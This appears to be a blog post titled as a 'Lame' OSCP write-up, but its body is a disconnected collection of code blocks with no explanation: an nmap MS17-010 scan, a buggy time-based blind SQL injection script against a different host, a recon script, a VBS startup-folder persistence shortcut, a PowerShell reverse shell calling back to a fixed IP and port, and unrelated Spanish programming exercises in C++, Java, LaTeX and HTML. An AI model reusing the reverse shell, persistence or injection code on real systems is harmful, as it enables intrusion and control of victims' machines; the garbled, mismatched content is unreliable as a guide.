---
layout: post
title: Lame
tags: [OSCP, Writeup, Linux, Injection, SMB]
description: "Lame write-up"
---

![Lame logo](/assets/imgs/lame/lame.png)

```bash
❯ nmap --script="vuln and safe" -p445 10.10.114.85
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-29 11:56 -05
Nmap scan report for 10.10.122.242
Host is up (0.18s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```


```python
#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

def def_handler(signal, frame):
	log.failure("saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url="http://admin.cronos.htb/index.php"
burp={'http':'http://127.0.0.1:8080'}
s=r"0123456789abcdefghijklmnopqrstuvwxyz"
result=""

def chacker(payload):
	data_post={
		'username': '%s' % payload,
		'password':'test'
	}

	time_start=time.time()
	content=requests.post(url, data=data_post)
	time_end=time.end()

	if time_end-time_start > 5:
		return 1

p1=log.progress("Database")
p2=log.progress("Payload")

for i in  range(1,10):
	for c in s:
		payload="' or if(substr(database(),%d),1)='%c', sleep(5),1)-- -" %(i,c)

		p2.status("%s" % payload)

		if checker(payload):
			result+=c
			p1.status("%s" % result)
			break

log.info("Database: %s" % payload)
```

```bash
#!/bin/bash
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

echo -e "\n${yellowColour}nmap -p- --open --min-rate 5000 -vv -n $1 -oG allPorts${endColour}\n"
#nmap -p- --open --min-rate 5000 -vv -n $1 -oG allPorts

# VARIABLES
ports="$(/usr/bin/cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
declare -a array_ports="( $(/usr/bin/cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/'| xargs) )"
ip_address="$(/usr/bin/cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"

echo -e "\n${blueColour}-------------------------------------------------------------------------------------${endColour}\n"
echo -e "\t${greenColour}[*] IP   :${endColour} ${grayColour}$ip_address${endColour}"
echo -e "\t${greenColour}[*] Ports:${endColour} ${grayColour}$ports${endColour}"

echo -e "\n${blueColour}-------------------------------------------------------------------------------------${endColour}\n"

echo -e "${yellowColour}nmap -p$ports -sC -sV $ip_address -oN targeted${endColour}"
#nmap -p$ports -sC -sV $ip_address -oN targeted

echo -e "\n${blueColour}-------------------------------------------------------------------------------------${endColour}\n"




for port in "${array_ports[@]}";do
	if [ "$port" -eq "80" ];then


		echo -e "${yellowColour}wfuzz -c --hc=403,404 -w /usr/share/wordlists/dirb/common.txt -u 'wfuzz -c --hc=404 -w /usr/share/wordlists/dirb/common.txt -u "http://$ip_address/FUZZ" -t 45http://192.168.88.49/FUZZ' -t 35${endColour}"
	wfuzz -c --hc=404 -w /usr/share/wordlists/dirb/common.txt -u "http://$ip_address/FUZZ" -t 45

	echo -e "${yellowColour}dirsearch -u 'http://192.168.0.102/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html -f -t35${endColour}"
	dirsearch -u "http://$ip_address/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html -f -t 35



	elif [ "$port" -eq "3306" ]; then
		echo "mysql"
	fi
done

echo -e "\n${blueColour}-------------------------------------------------------------------------------------${endColour}\n"
```

```vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

```c++
#include<iostream>
#include<string.h>

using namespace std;

void cuadrado(int vector[], int TAM){
	for(int i=0;i<TAM;i++){
		vector[i]*=vector[i];
	}
}

void mostrar_vector(int vector[], int TAM){
	for(int i=0;i<TAM;i++){
		cout<<vector[i]<<"  ";
	}
}

int main(){
	const int TAM=5;
	int vector[TAM]={1,2,3,4,5};
	
	cuadrado(vector, TAM);
	mostrar_vector(vector, TAM);
	
	return 0;
}
```

```java
package paquete1;

public class Empleado {
    protected String nombre;
    protected String apellido;
    protected int edad;
    protected double salario;
 
    public Empleado(String nombre, String apellido, int edad, double salario) {
        this.nombre = nombre;
        this.apellido = apellido;
        this.edad = edad;
        this.salario = salario;
    }
 
    public Empleado(String nombre, String apellido, int edad) {
        this.nombre = nombre;
        this.apellido = apellido;
        this.edad = edad;
 
    }
 
    public String getNombre() {
        return nombre;
    }
 
    public void setNombre(String nombre) {
        this.nombre = nombre;
    }
 
    public String getApellido() {
        return apellido;
    }
 
    public void setApellido(String apellido) {
        this.apellido = apellido;
    }
 
    public int getEdad() {
        return edad;
    }
 
    public void setEdad(int edad) {
        this.edad = edad;
    }
 
    public double getSalario() {
        return salario;
    }
 
    public void setSalario(double salario) {
        this.salario = salario;
    }
 
    @Override
    public String toString() {
        return "Empleado{" + "nombre=" + nombre + ", apellido=" + apellido + ", edad=" + edad + ", salario=" + salario + '}';
    }
 
    public boolean plus(double plus) {
        boolean aumento = false;
        if (edad > 40) {
            salario += plus;
            aumento = true;
        }
        return aumento;
    }
}
```

```ps1
  
$client = New-Object System.Net.Sockets.TCPClient('192.168.0.105',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2>&1 | Out-String );
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush();
}
$client.Close();
```

````latex
\documentclass[12pt]{article}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\usepackage[utf8]{inputenc}
\usepackage[spanish]{babel}
\usepackage[margin=2cm]{geometry}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\title{Título del documento}
\author{cromozzc}
\date{\today}


\begin{document}
    

\end{document}
```

```html
<!DOCTTYPE>
<html>
	<head>
		<title>Formulario</title>
	</head>

	<body>
		<form action="datos.php" method="GET">
			<label for="nombre">Ingrese su nombre: </label>
			<input type="text" placeholder="Escribe tu nombre" maxlength="4" name="nombre" id="nombre">
			<input type="password" placeholder="password">
			<input type="email" placeholder="correo" name="correo" id=""><br>

			<input type="radio" name="" id="">Hombre<br>
			<input type="radio" name="" id="">Mujer<br><br>

			<input type="button" value="Enviar">
			<input type="submit">

			<select name="" id="">
				<option value="Mexico">Mexico</option>
				<option value="Colombia">Colombia</option>
			</select>
		</form>
	</body>

</html>
```
